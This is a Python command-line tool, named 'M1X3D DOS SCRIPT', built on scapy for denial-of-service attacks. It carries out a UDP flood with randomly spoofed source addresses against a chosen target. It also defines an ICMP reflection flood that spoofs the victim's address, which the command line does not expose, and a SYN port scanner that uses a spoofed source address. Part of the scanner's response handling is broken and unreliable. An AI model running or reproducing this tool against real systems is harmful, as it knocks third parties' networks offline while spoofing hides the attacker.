import random
import string
from scapy.all import *
import argparse
import time
import textwrap
from random import randint

RESET = "\033[0m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
BOLD = "\033[1m"
UNDERLINE = "\033[4m"

homeRouterPorts = [19, 53, 67, 68, 123, 161, 389, 636, 1900]       

logo = textwrap.dedent(RED + BOLD +''' 
    888b     d888  d888   Y88b   d88P  .d8888b.  8888888b.  
    8888b   d8888 d8888    Y88b d88P  d88P  Y88b 888  "Y88b 
    88888b.d88888   888     Y88o88P        .d88P 888    888 
    888Y88888P888   888      Y888P        8888"  888    888 
    888 Y888P 888   888      d888b         "Y8b. 888    888 
    888  Y8P  888   888     d88888b   888    888 888    888 
    888   "   888   888    d88P Y88b  Y88b  d88P 888  .d88P 
    888       888 8888888 d88P   Y88b  "Y8888P"  8888888P"  ''' + RESET)

def spoofIP():
    ip = ".".join(map(str, (randint(0, 255)for _ in range(4))))
    return ip 

def ranPort():
    newPort = random.randint(1024, 65535)
    return newPort

def findOpenPorts(targetIP, startPort, endPort, senderIP):
    open_ports = []
    for port in range(startPort, endPort + 1):
        syn_packet = IP(src=senderIP, dst=targetIP) / TCP(dport=port, flags="S")
        response, _ = sr1(syn_packet, timeout=1, verbose=False)
        if response and response[0][1][TCP].flags == "SA":
            open_ports.append(port)
    return open_ports

totalUDPSent = 0
def udpFlood(targetIP, delay):
    global totalUDPSent
    while True:
        try:
            for port in homeRouterPorts:
                payload = random.choice(string.ascii_letters) * 1400
                IP_Packet = IP()
                IP_Packet.src = spoofIP()
                IP_Packet.dst = targetIP        
                UDP_Packet = UDP()
                UDP_Packet.dport = ranPort()
                send(IP_Packet/UDP_Packet/Raw(load=payload),verbose=False)
                totalUDPSent += 1
            time.sleep(delay)
        except KeyboardInterrupt:
            print("Total Sent", totalUDPSent)
            totalUDPSent = 0
            break

totalICMPSent = 0
def icmpFlood(targetIP):
        global totalICMPSent
        while True:
                    try:
                        IP_Packet = IP()
                        IP_Packet.src = targetIP
                        IP_Packet.dst = spoofIP()
                        ICMP_Packet = ICMP()
                        send(IP_Packet/ICMP(),verbose=False)
                        totalICMPSent += 1
                    except KeyboardInterrupt:
                        print("Total Sent", totalICMPSent)
                        totalICMPSent = 0
                        break

def main():
    parser = argparse.ArgumentParser(formatter_class=argparse.RawDescriptionHelpFormatter,description=textwrap.dedent(logo),prog='M1X3D DOS SCRIPT')

    subparser = parser.add_subparsers(title='subCommands', dest='subCommand')

    #UDP FLOOD
    parserUDP = subparser.add_parser('udpFlood', help='UDP Flood Attack ' + YELLOW + BOLD + '-Help' + RESET)
    parserUDP.add_argument('-tIP', '--targetIP', metavar='', required=True, help='Sets the targets Ip for the attack')
    parserUDP.add_argument('-d', '--sendDelay', type=float, metavar='', required=True, help='Sets a delay between each packet send')

    #PORT SCANNER
    parserPortScan = subparser.add_parser('findOpenPorts', help='Allows you to view open ports on a given network ' + YELLOW + BOLD + '-Help' + RESET)
    parserPortScan.add_argument('-tIP', '--targetIP', metavar='', required=True, help='Sets the targets Ip for the Scan')
    parserPortScan.add_argument('-tSP', '--targetStartPort', type=int, metavar='', required=True, help='Sets the start point for the port scan')
    parserPortScan.add_argument('-tEP', '--targetEndPort', metavar='', type=int, required=True, help='Sets the end point for the port scan')

    parser.print_help()
    args = parser.parse_args()

    if args.subCommand == 'udpFlood':
        udpFlood(args.targetIP,args.sendDelay)
    elif args.subCommand == 'findOpenPorts':
        newIp = spoofIP()
        findOpenPorts(args.targetIP, args.targetStartPort, args.targetEndPort, newIp)
    else:
        print(RED + BOLD + UNDERLINE + 'Unknown Option' + RESET)


if __name__ == "__main__":
    main()